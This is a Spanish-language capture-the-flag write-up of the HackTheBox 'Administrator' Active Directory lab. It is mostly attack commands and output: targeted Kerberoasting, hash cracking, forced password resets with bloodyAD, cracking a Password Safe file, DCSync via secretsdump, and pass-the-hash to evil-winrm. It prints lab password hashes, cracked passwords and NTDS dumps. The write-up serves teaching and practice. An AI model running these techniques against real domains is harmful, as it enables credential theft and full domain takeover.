---
tags:
title: Administrator - Medium (HTB)
permalink: /Administrator-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento 

```bash
nmap -sCV -p21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49668,54879,54884,54889,54908,54911 10.129.247.91
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-25 01:57 -03
Nmap scan report for 10.129.247.91
Host is up (0.82s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-25 11:58:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
54879/tcp open  msrpc         Microsoft Windows RPC
54884/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
54889/tcp open  msrpc         Microsoft Windows RPC
54908/tcp open  msrpc         Microsoft Windows RPC
54911/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-25T11:59:31
|_  start_date: N/A
|_clock-skew: 7h00m49s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 131.53 seconds
```

# Service enumeration

### RPC / Port 135

Con las credenciales que tenemos de manera inicial primero solicitemos un `TGT`para el usuario `olivia` 

```bash
impacket-getTGT administrator.htb/Olivia:ichliebedich -dc-ip 10.129.247.91                    
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

 Debido a que nuestro reloj no esta sincornizado con el del `Domain Controller` con `ntpdate` lo sincronizamos.
 
```bash
ntpdate -b 10.129.247.91
2025-10-25 09:05:50.925091 (-0300) +0.005873 +/- 0.228908 10.129.247.91 s1 no-leap
CLOCK: time stepped by 0.005873
```

Y ahora volvemos a solicitar el `TGT` para despues exportarlo a la variable de `Kerberos.`

```bash
impacket-getTGT administrator.htb/Olivia:ichliebedich -dc-ip 10.129.247.91 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Olivia.ccache
```

```bash
export KRB5CCNAME=Olivia.ccache 
```

 De otra forma podemos usar `kinit` para realizar la misma accion proporcionando el nombre y la password

```bash
kinit Olivia@ADMINISTRATOR.HTB
Password for Olivia@ADMINISTRATOR.HTB:
```

Y ahora ya podemos intentar enumerar usuarios del dominio con `rcpclient`
```bash 
rpcclient -U 'Olivia' dc.administrator.htb --use-kerberos=required --realm administrator.htb
Password for [WORKGROUP\Olivia]:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[olivia] rid:[0x454]
user:[michael] rid:[0x455]
user:[benjamin] rid:[0x456]
user:[emily] rid:[0x458]
user:[ethan] rid:[0x459]
user:[alexander] rid:[0xe11]
user:[emma] rid:[0xe12]
```

Vemos que al tratar de realizar un kerberoasting con el usuario `olivia` obtenemos un `tgs` del usuario `krbtgt` pero adelanto que no es crackeable ya que la pasword de este usuario siempre es una contraseña muy fuerte contra ataques de fuerza bruta

```bash
impacket-GetUserSPNs  administrator.htb/Olivia -k -usersfile users -request -dc-ip 10.129.247.91 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[-] CCache file is not found. Skipping...
[-] Principal: Administrator - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Guest - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$18$krbtgt$ADMINISTRATOR.HTB$*krbtgt*$d3153d8d8cac21fafca70d54$0a3cd64637b0b7f83111273936feb20581b6e7a9b12c301a4c81e1fc42521fe0866a0194f1ee0396b3d190ca282429bb97472aa04f658108dd7b2278a9dbb0d326c71352de27c1fe6213660e32a7340f28f346cc86c6bfd0949a54b7ebcc2aa94d19afc09570f93e1be340dcc7e4c0406305be5a094bc2997fca14d0d05ed33c298197777fbc05841f5dcb38fd7a2317ea35eff1dfa4f3ad2640cc42b3f8a946364bc3e751cfcbcaa325952a9ce720d9b84a13dbaa7775dd97d0e7b6b3bd495628e149f1014851cd4d1b7f1990a8664301e3a34cb1f80233370f92cce7dec057fe446a5caf17126e1948ac1b1df9d8b67757ea174e705b43862886ee6241aac7f5c7475e3e4fda45c2d13c29f503bfdb44a15e8012c1687cd8c39b04fdea48451cff83a52c6955c3f0749e4b74312e581fd900667a6485178434473712c84ecffc2bb6beb8e406b4cfd6545d034d68ece6e73152d7e5221d80f3927f5d984e52fafef6b65fbf82720e9ae14b4e6db5e694575a4e3b4d134007d0d029e15b681114db5a33c30d1f8c351fc2114183f018013dfa3b71c3c8abca77a35e449e4c57ce086557635a2c0cd1e5fb427e3fe47d7297e16a5767bc53b69a65ca0a36f71bca0897a076a063ac2e81d3ab97748a16a430c30be90bf869d38337dab98683f0cf406b55fe5ac97f8ae8496213a7f2a8a28a03219719fe09fef5f2a09a7bb22b5af94dbd8f782484842caa665fab7d0845687925121e116429b16fa8fc39a3303fe2b20ef91b6675ad18d553ce9c63ef2ae84c512a7bb69b2239355164330a437c625a0916415f1682c7293257b230314b7b8778c99b7dc49f18f440dd3dc08c1f54e26633430974e2a6a1da31688e5a9d13b2050f44c32e1c144f13952644a886dc70e340a9998caf17dcbc7816bb063124b7e127a03e4b3b0f783861655e4264d88a19c24adfac4d08efb39acfa5623b16955b89d2a11e32d9d9c6060214e43f4cf048e06e6c06b52cd526eb5a2050f21a828d3372f6114589767222890d3e6d21cb270ae37fc6ade13a52c4461031e7953f1cbc8ad4381010d3a28527e8e0b10093d80758a3cf364181ccf8da12e5424bd50d6287551cc932fceb9fb94d3e6c64d7f80f5e6feaf01901c673f0dac229152e7b08d2a6d1b691fff9af68185def235808318c5425e2dd53a4ac1c1d9c18c37079463f688791a895778a26e408c1fba9836f64ec1eb6c7c244870a0b452a48953040af8aa8b0e33526bcc8989980679b23d43bf45b761507512609c7caa730c0732656dd3e664a9feb42e5fb3d27f3964fe39e97cc7432c233f47cae8242a4dfbc6b7525592b2d5850f19ba774f98bbf49df79ea156d7b124c09bffe1f4dc5fe8c1c4c9bdae4a138905ea94e082e2429d3bdab64a437b08839f36119ca74d63de165c1ad195d11e675637b869aac5b920bf437bb8fc71eefec6deb5177cdc6163e18f08337c512a98d4ff5e87fdb683d31266773efb977df07807a31a9c807b09439d45b3bb636927e69962842
[-] Principal: olivia - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: michael - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: benjamin - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: emily - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: ethan - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: alexander - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: emma - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)

```

### ACL Enumeration.

#### FTP as benjamin

Una vez cargamos los datos con `bloodhound-python` vemos que `olivia` tiene permisos `GenericAll` sobre michael, por lo que podemos tratar de soliciatar un `TGS` para ese usuario y luego asi podemos romper el hash para obtenersu contraseña en texto claro.

![{15536D87-2C15-4266-A1C4-9B6045030575}](images/{15536D87-2C15-4266-A1C4-9B6045030575}.png)

```bash
python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'olivia' -p 'ichliebedich'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (michael)
[+] Printing hash for (michael)
$krb5tgs$23$*michael$ADMINISTRATOR.HTB$administrator.htb/michael*$37396d9a11337c2d429d742a65ff3140$c140378202558170cfe84e7088ee2afa0035a5296467138a695a9165dc7ea31752ae120515478272b6f84eef682599dbbfd5dfe45a0ca7f526ce1fc54174dae4e0675cca7c2e05aaea9e247d9f88867b9fe9680bc671b42f096638001b4e165243f31fdcab7ff477eafac0ed23c2caa7228df7c47a8ec5deaabd527fb9b29083d8f7436fc09e4b0224401f7b2af9f281e3b31a5a200b8a46b6ad25a98af5b30b59e46176171fd6285674e4ca50fd522f633c166b6b3d84d5ab3e554e5b0a9a4a39a844701237a02997b6a999cf296c71d770833d0df51f6280ced00ffef1b6da9b20557aa3db61ba52bec15d7b544c633d6b02e6dae53bb536f4b8fd149974cbd189fda7f2a5017babcea47cf2d8eedba9cf24ea7207a92e85e9358ebe05af56e50ad7406ded4ccd21ef037da5e2e146b050288327b19d493eb31bdd452360901f0938e2b85f6335193fcee7dca68de90e51bdafc874de69f7172c918e6e9b3028c613ce54f04e3a6e3a7171fed139061785165cfc78ba3e3215aa39ab9da6f7e374d6e344e8402b6b9dbcdad0b65f5c16e4d97070776c1e0ea10bba59c88aef60b649a69605e2f954563c6f0815c28736b3e1f9b7aded54879e5064bc2385c8cf7ca74424104a5c880bcf4f837495b7f6282e63fd971404ab49f712d5cfbd27bb2af79f1a52b6e682ca910d41809f900020c2e52fddab6752691e3fae23c94d70774e99502d6ecba6b0515fd69300dcff83ab08d6f63d0e90b09b4d39d8b9600c63f41b7d48919e19406e60d8ab0d7cf9170f783698d3cf1917fec2d8cb02e1de85a659fe30411c7a7c37088d754e57fe3126f2404bdd0fae0dfd4298ede6982c2bea80ea762bb0a95cd238f87edab9c5859b079ceb4113d502ca6f8a45b83c2ebe3a1c44f56311bc73444fb5eed749e99b38e4ead1326d05f5ee2356dfd79e75ea98cb5fa0eaf8b5254c0361fdc69cf1cfbc433dd3db9ce0b00a3b545264603c7b26d668552dbf1f42eb4a84aa2a46cd3b6f24a6b4b2ba4a412942c3f7927dc50041a089808783e444b023fd7fe6fd257a39bce85a8666ad48e15c708cb1cd9c5815d768fac02adad05561981ce77b80137d101aded8df7b6818412472c4cda0c22345b9b31ad85ae5db2dc471051f32b63c542b745b8d53b79466398df2d6a675b941a367620c999ea797c3611b66ae3b3dfed119aa51a6433ae95bf54f0a35659729d5fc633a7dacdbbd31add119a8ad4bb2f8e85eb267f8c8f53e2a22b8a0da34ccf41b7800078ea8e086b89567e4b50af215fbf34f4b643594a92c88318cc5bf7fdb47294c7eef0ad1ba6d5f6df76561a01f71a4ae6aa74a4b05daf513504f357ca444beaef7a5e5deb93b15779f825b70192c961883749e94784c8ac5cab51b7ce5f241df1e1c63c7993e39849963dfb3f04db1304cac21beb6521af01e0763bb90a67a5f8cd35a83c7cba1c4d4d6f956bea99ed17786d0b19d88de26ce4b620dcaf90bd13d730d1cb08cf189905667592e7d88ed
[VERBOSE] SPN removed successfully for (michael)
```

Debido a que `john` no me mostro la password, fui al donde se realiza el almacenado de la misma en el directorio `~/john/john.pot`

```bash
cat ~/.john/john.pot | grep michael
$pwsafe$*3*801e25992487ae60938723973f543abd7d1fab81f45da156194bc6e1976f8c59*262144*3e1d616a8f82a02514ed88cd37f1b6eab303d9a687c4d48fbe0c866775617978:michaeljackson
```

`michael:michaeljackson`

Vemos que `michael`, tiene permisos `ForceChangePassword` sobre `benjamin` 
![Untitled 103](images/Untitled 103.jpg)

Para el cambio de password podemos usar `bloodyAD`, para cambiarle una nueva pass para el usuario `benjamin`

```bash
bloodyAD --host dc.administrator.htb -d administrator.htb -u michael -p 'michaeljackson' -k --dc-ip 10.129.247.206 set password benjamin test123
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/bloodyAD/msldap_patch.py", line 774, in authenticate
    for target in self.ccred.ccache.list_targets():
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: 'NoneType' object has no attribute 'list_targets'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/bin/bloodyAD", line 8, in <module>
    sys.exit(main())
             ~~~~^^
  File "/usr/lib/python3/dist-packages/bloodyAD/main.py", line 201, in main
    output = args.func(conn, **params)
  File "/usr/lib/python3/dist-packages/bloodyAD/cli_modules/set.py", line 86, in password
    conn.ldap.bloodymodify(target, {"unicodePwd": op_list})
    ^^^^^^^^^
  File "/usr/lib/python3/dist-packages/bloodyAD/network/config.py", line 128, in ldap
    self._ldap = Ldap(self)
                 ~~~~^^^^^^
  File "/usr/lib/python3/dist-packages/bloodyAD/network/ldap.py", line 185, in __init__
    raise e
  File "/usr/lib/python3/dist-packages/bloodyAD/network/ldap.py", line 172, in __init__
    raise err
  File "/usr/lib/python3/dist-packages/msldap/connection.py", line 407, in bind
    raise err
  File "/usr/lib/python3/dist-packages/bloodyAD/msldap_patch.py", line 785, in authenticate
    tgt = await self.kc.get_TGT(override_etype=self.credential.etypes)
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/minikerberos/aioclient.py", line 314, in get_TGT
    rep = await self.do_preauth(supported_encryption_method, with_pac=with_pac)
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/minikerberos/aioclient.py", line 195, in do_preauth
    raise KerberosError(rep, 'Preauth failed!')
minikerberos.protocol.errors.KerberosError: Preauth failed! Error Name: KDC_ERR_PREAUTH_FAILED Detail: "Pre-authentication information was invalid" 

```

Debido a que con la contraseña de michael nos dio error, con las credenciales de `olivia` le seteamos unas nuevas. y asi con las mismas cambiarle la pass a `benjamin`.

```bash                                                         
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/administrator]
└─# bloodyAD --host dc.administrator.htb -d administrator.htb -u olivia -p 'ichliebedich' -k --dc-ip 10.129.247.206 set password michael test123  
[+] Password changed successfully!
```

## Shell as emily 

Como el usuario `benjamin` podemos loguearnos en `ftp`, donde dentro de ahi hay un archivo de base de datos de `psafe`
```bash
ftp 10.129.247.206 
Connected to 10.129.247.206.
220 Microsoft FTP Service
Name (10.129.247.206:zs1n): benjamin        
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||64100|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||64102|)
125 Data connection already open; Transfer starting.
100% |************************************************************************************************************************************************|   952        1.34 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:01 (0.89 KiB/s)
ftp> exit
221 Goodbye.
```

Como el archivo esta protegido con contraseña maestra con `pwsafe2john` convertimos el archivo a un hash que podamos romper

```bash
john safe_hash -w=/usr/share/wordlists/rockyou.txt  
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tekieromucho     (Backu)     
1g 0:00:00:00 DONE (2025-10-27 06:32) 6.666g/s 109226p/s 109226c/s 109226C/s 123456..cocoliso
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Nos logueamos con esa pass y vemos credenciales para 3 `users`.

```bash
cat pass 
emily:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
alex:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

Con esa pass podemos loguearnos via `evil-winrm`, donde podemos ver la primera flag.
```bash
evil-winrm -i administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily\Documents> type ../desktop/user.txt
47431458d7116994748c7c5d3b077ac0
```

Como podemos ver, `emily` tiene la capacidad `GenericWrite` sobre ethan, donde a su vez el mismo usuario tiene la capacidad de performar un ataque `DCSync` sobre el dominio.

![Untitled 104](images/Untitled 104.jpg)

Solicitamos un `TGS` para ethan.
```bash
python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (ethan)
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$da610d4573339d2ea7576adb872a81fa$f84151552b29c552eff7b30b28349dd2876204a07cb53b0f02c51256e3a44ca5d6cbd8492d01830d695bd332a501b59144d8099e18705e1a48651685ce4d3b5f4cf5f5d1692e324d6658ee8c295e53eac50c1eb31d2ba63b6a99783fbfa02c8059851a09d3de1f26116bb00d6a0a37827bac2d651fcec5a3a4585d0cf2ad83f9689e79dc172d60a87b0ee50846409b84847610afe02a777e0479d1e32be331f5fcf21ed6d4f1de23b849715e28c60ee2f050f5cc1562bfb3d7907f8d99a61abfc065886447793247ae0adbd3fdd05417683976f4aa40a3ba909a0d904e3fc7a4d30d718433ca14e15b8a739005a2abd60b77cc2a3e0636b957513a0df085f2089c99de154bd7170959c52b8a1e5f136da70e7be53367e004c1b9e43bfaea70eb6906fd88c4abc0fed6fb18371d752b20ad55feaa7192007c00a82ae228f2ae8e44eb1332d96f8456799a8f94ee958e808fc499f65daaaaaa1470a72d858381327ae5bffd736e7edba6c11d2f26f82ace7fcb0e3342f9538e3b12c6293db470267ae11e669b6bae5e010efc101553defd14dc8c812914408d2485f669c60c76fa1bfd6962d6c49f20c283b4556ea5f0b7a695fd63c6ddf5f7b2ad1fd44c0534a0154d1f5a6075e0af353747f3787a94b66fae7ad5cc4cb343943d9eaa36539483959b3ddbe65a79c2d8e305588e5f503a9cc31c4143cd0412e4399d52ab856559c861fd89a6cf0ec12a43e3d8249464ae7b44f37379e70b9ddbc3a06c52c7bf33e6728b0da9c9b6cc0a5211f96db962d1dc72f1e4ae094ef5c5005f3471924c6fb648ef67bc712f9dbc743e0b1af3cfd05012816febb4b5df49cc9e5674fb89aa1b58fbce76741d11e2e783456bb4308ebb567ef9d9d81cc39820ee4a1923a147737651c76a64004ce323b8a1ac85a5191707f811a38407d977d2ec14b85d0c89f51d654e7ce01bdf86583edff16f10ad58473c37bc27ce9731c341ef824c6163ea19199fc86e7d709ff89bbef0331c9691e82dcef8ae49092cfcf4be30f51b8ce894fc9e875b814c5075c96c6a20c60ad037b78e8464fd7b7ee19109ad83182790f80168553bb70c94f2544ba046df3af2051ed39eb9bdb61367137f843b2c2afb8a8ede40695315f801d6e4f5f46441a3f39235bb61fc381112da1b1d056e5e4f0fdadf95ae0b6e1913b20db2bf2dbf9ea8a5d5501ff2bc57af028da0050b14e28b0a5296e72cd82a3ad473ad18c6a6292d10fa1bc692eb3b7f5249264669a1fae74a6c4021c89c5010bffdae4a5169303870ef72acf858b5361f14a6dda5c6eb6a6e6a2aebf494f9735ec7817ea64b68f0a2be85d286841c5daae54201687195864759273f867b8cedf6f3229d9af4341d7f21d10afcb4b1143283548ce65aa3976d4ef58ed9a6d15f782ae6193393883b902dd4d5c7e249006fddfd53a245b4790e0908007b668d1227d72fa5973bb35c24ba727d4c9776146c5f6a82c8bf5bae9c28e99163a36ec0c1b695adbae88b37c89e314ff886a47b9231be11a0
[VERBOSE] SPN removed successfully for (ethan)
```

Rompemos el `hash`
```bash
john hash_ethan -w=/usr/share/wordlists/rockyou.txt  
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
limpbizkit       (?)     
1g 0:00:00:00 DONE (2025-10-27 06:42) 100.0g/s 819200p/s 819200c/s 819200C/s newzealand..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Y una vez tenemos la pass dumpeamos las credenciales del dominio con sus credenciales.

```bash
impacket-secretsdump administrator.htb/ethan:limpbizkit@dc.administrator.htb -k -dc-ip 10.129.247.206
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:c5a237b7e9d8e708d8436b6148a25fa1:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:c5a237b7e9d8e708d8436b6148a25fa1:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:2957f1145bc59d735988ee714ff988815d8ca32f3866a0a3a0f04b37f7b966bd
administrator.htb\michael:aes128-cts-hmac-sha1-96:f67deae35c88b405c796a12245ab03ad
administrator.htb\michael:des-cbc-md5:1f318919fd19155e
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:3ae7885006f74f91511ac4e0ea3af9a9adce63cc8ee475e67efeb933179d3c65
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:df991661734ab03a8ae9836d7bfeb46e
administrator.htb\benjamin:des-cbc-md5:e6201098da6dbcb0
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
[*] Cleaning up...
```

Una vez obtenemos el hash del usuario `Administrator`, solicitamos un `tgt` y luego nos conectamos a la maquina vía `WinRM`

```bash
impacket-getTGT 'administrator.htb/administrator' -hashes aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e -dc-ip 10.129.247.206
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in administrator.ccache
                                                                                                                                                                                             
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/administrator]
└─# export KRB5CCNAME=administrator.ccache
```

```BASH
evil-winrm -i administrator.htb -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```

`~Happy Hacking.`